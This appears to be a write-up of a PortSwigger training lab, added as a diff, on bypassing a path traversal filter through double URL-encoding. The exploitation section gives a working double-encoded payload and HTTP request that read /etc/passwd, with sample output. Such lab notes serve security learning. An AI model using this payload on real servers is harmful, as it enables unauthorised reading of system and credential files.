@@ -1,0 +1,50 @@
+================================
+LAB: File path traversal, traversal sequences stripped with superfluous URL-decode
+================================
+
+[LAB INFORMATION]
+-----------------
+Date: 2026-01-22
+Lab URL: https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode
+Category: Path Traversal
+Level: Apprentice
+Objective: Retrieve the contents of the /etc/passwd file from the server.
+Description: The application serves product images via a filename parameter. It strips path traversal sequences before performing an additional URL-decode, which can be abused using double-encoded traversal sequences to reach arbitrary files on the filesystem.
+
+[RECONNAISSANCE]
+----------------
+- Observed a request pattern for images using the endpoint /image?filename=.
+- Confirmed that supplying a direct path traversal payload such as ../../../../etc/passwd returns a 200 response but with image content, indicating that traversal is filtered before file resolution.
+- Noted from the lab description that the application performs URL-decoding after filtering potentially dangerous sequences.
+
+[VULNERABILITY DISCOVERY]
+-------------------------
+- Initial test with filename=../../../../etc/passwd was blocked by the application-side filter, which appears to remove or reject raw ../ sequences.
+- Single URL-encoding of ../ as %2e%2e%2f was considered, but HTTP servers typically decode once before passing the value to the application, meaning the filter would still see ../ and block it.
+- The key observation is the "superfluous URL-decode": the server decodes once, and then the application decodes again, allowing the use of double-encoded traversal sequences that bypass the filter during the first pass but resolve to ../ after the second decode.
+
+[EXPLOITATION]
+--------------
+- Crafted a double-encoded traversal payload where . and / are encoded twice in the leading segments.
+- Final payload used in the filename parameter:
+  %2e%252e%252f%2e%252e%252f%2e%252e%252f%2e%252e%252f%2e%252e%252f%2e%252e%252f%2e%252e%252f%2e%252e%252f%2e%252e%252f%2e%252e%252f%2e%252e%252fetc%2fpasswd
+- Sent the following HTTP request to the image endpoint:
+  GET /image?filename=%2e%252e%252f%2e%252e%252f%2e%252e%252f%2e%252e%252f%2e%252e%252f%2e%252e%252f%2e%252e%252f%2e%252e%252f%2e%252e%252f%2e%252e%252f%2e%252e%252fetc%2fpasswd HTTP/2
+  Host: <LAB-HOST>
+- On the first decode layer, %252e becomes %2e and %252f becomes %2f, so the filter does not see ../ and allows the input.
+- On the second decode, %2e%2e%2f collapses into ../ sequences, enabling directory traversal to reach /etc/passwd.
+
+[EVIDENCE]
+----------
+- The server responded with HTTP 200 and Content-Type: image/jpeg but the body contained the contents of /etc/passwd, including lines such as:
+  root:x:0:0:root:/root:/bin/bash
+  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+  user:x:12000:12000::/home/user:/bin/bash
+- Presence of valid system and application users in the response body confirms successful arbitrary file read.
+
+[LESSONS LEARNED]
+-----------------
+- Filters that act on already-decoded input can be bypassed when additional decoding occurs later in the processing chain.
+- Double-encoding of special characters is a powerful technique for exploiting path traversal when straightforward ../ payloads are blocked.
+- When testing for path traversal, it is important to try various encoding combinations (single, double, over-encoding) and to observe subtle differences in server responses.
+- Automated payload lists in Burp Intruder (such as fuzzing path traversal lists) are useful, but understanding the decode/validation order is crucial for crafting reliable manual exploits.
